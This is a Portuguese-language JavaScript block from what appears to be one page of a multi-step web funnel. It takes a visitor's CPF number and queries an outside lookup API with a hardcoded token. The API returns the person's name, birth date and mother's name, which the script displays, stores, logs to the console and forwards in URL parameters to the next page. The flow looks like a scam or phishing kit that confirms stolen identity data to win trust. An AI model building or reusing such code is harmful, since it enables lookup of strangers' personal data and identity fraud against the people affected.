    <script>
        // =======================================================
        // SISTEMA DE PASSAGEM DE PARÂMETROS URL
        // =======================================================
        
        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams) {
                params[key] = value;
            }
            return params;
        }

        function buildUrlWithParams(baseUrl, additionalParams = {}) {
            const params = getUrlParams();
            const url = new URL(baseUrl, window.location.href);
            
            Object.keys(params).forEach(key => {
                url.searchParams.append(key, params[key]);
            });
            
            Object.keys(additionalParams).forEach(key => {
                if (additionalParams[key]) {
                    url.searchParams.append(key, additionalParams[key]);
                }
            });
            
            return url.toString();
        }

        console.log('Parâmetros atuais da página 3:', getUrlParams());

        // =======================================================
        // CÓDIGO ORIGINAL
        // =======================================================

        const UserData = {
            save: function(dados) {
                sessionStorage.setItem('user_data', JSON.stringify(dados));
            },

            load: function() {
                const dados = sessionStorage.getItem('user_data');
                return dados ? JSON.parse(dados) : null;
            },

            update: function(novosDados) {
                const dadosExistentes = this.load() || {};
                const dadosAtualizados = { ...dadosExistentes, ...novosDados };
                this.save(dadosAtualizados);
                return dadosAtualizados;
            },

            clear: function() {
                sessionStorage.removeItem('user_data');
            }
        };

        let currentUserData = {};

        document.getElementById('cpf').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length <= 11) {
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                e.target.value = value;
            }
        });

        async function consultarCPF(cpf) {
    try {
        const cpfLimpo = String(cpf).replace(/\D/g, '');

        if (cpfLimpo.length !== 11) {
            throw new Error('CPF inválido: deve conter 11 dígitos');
        }

        const tokenApi = '2077';

        const url = new URL('https://searchapi.it.com/consulta');
        url.searchParams.set('cpf', cpfLimpo);
        url.searchParams.set('token_api', tokenApi);

        const response = await fetch(url.toString(), {
            method: 'GET',
            headers: {
                Accept: 'application/json'
            }
        });

        if (!response.ok) {
            throw new Error(`Erro na consulta: HTTP ${response.status}`);
        }

        const payload = await response.json();
        const dados = payload?.dados?.[0];

        if (Number(payload?.status) !== 200 || !dados) {
            throw new Error(payload?.erro || 'CPF não encontrado');
        }

        return {
            nome: dados.NOME || '',
            data_nascimento: dados.NASC || '',
            mae: dados.NOME_MAE || ''
        };

    } catch (error) {
        console.error('Erro ao consultar CPF:', error);
        throw error;
    }
}

        document.getElementById('continuar-btn').addEventListener('click', async function() {
            const cpf = document.getElementById('cpf').value;

            if (cpf.length < 14) {
                alert('Por favor, preencha um CPF válido.');
                return;
            }

            document.getElementById('form-screen').classList.add('hidden');
            document.getElementById('loading-screen').classList.remove('hidden');

            try {
                const userData = await consultarCPF(cpf);

                if (userData && userData.nome) {
                    currentUserData = {
                        cpf: cpf,
                        cpf_limpo: cpf.replace(/[^\d]/g, ''),
                        nome: userData.nome,
                        data_nascimento: userData.data_nascimento,
                        mae: userData.mae
                    };

                    document.getElementById('loading-screen').classList.add('hidden');
                    document.getElementById('success-screen').classList.remove('hidden');

                    document.getElementById('user-name').textContent = userData.nome;
                    document.getElementById('user-birth').textContent = userData.data_nascimento;

                    UserData.update({
                        ...currentUserData,
                        etapa_atual: 'dados_cadastrados',
                        cadastro_data: new Date().toISOString()
                    });

                    console.log('Dados salvos:', UserData.load());
                } else {
                    document.getElementById('loading-screen').classList.add('hidden');
                    document.getElementById('form-screen').classList.remove('hidden');
                    alert('CPF não encontrado. Tente novamente.');
                }
            } catch (error) {
                document.getElementById('loading-screen').classList.add('hidden');
                document.getElementById('form-screen').classList.remove('hidden');
                alert(`Erro: ${error.message}`);
            }
        });

        document.getElementById('continuar-final').addEventListener('click', function() {
            const additionalParams = {
                cpf: currentUserData.cpf_limpo || '',
                nome: currentUserData.nome || ''
            };

            console.log('Passando para próxima página:', additionalParams);

            window.location.href = buildUrlWithParams('2.html', additionalParams);
        });

        window.getCustomerData = function() {
            const params = getUrlParams();
            return {
                cpf: params.cpf || '',
                nome: params.nome || ''
            };
        };
